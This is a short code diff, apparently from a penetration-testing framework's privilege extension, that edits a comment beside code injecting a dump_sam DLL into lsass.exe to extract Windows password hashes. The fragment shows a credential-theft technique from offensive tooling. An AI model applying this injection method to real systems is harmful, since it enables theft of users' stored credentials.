@@ -503,7 +503,10 @@ DWORD __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresul
 		dprintf("[PASSWD] Injecting into lsass.exe pid: %u", dwLsassPid);
 
 		/* todo: change the ReflectiveLoader string here, it's silly */
-		/* todo: support the offset for obfuscated dlls */
+		/* Currently is hard to support obfuscation of dump_sam.
+		    Due to how dump_sam is embedded inside the priv extension.
+		    Hardcoding offset to 0 so it will use the original `ReflectiveLoader` 
+		*/
 		if ((dwResult = met_api->inject.dll(dwLsassPid, dwLsassArch, dump_sam, (DWORD)stResourceSize, LOADER_ORDINAL(EXPORT_REFLECTIVELOADER), 0, pvParameterMemory, 0)) != ERROR_SUCCESS)
 			BREAK_WITH_ERROR("[PASSWD} Unable to inject DLL", dwResult);
 		dprintf("[PASSWD] Successfully injected the DLL into lsass.exe");
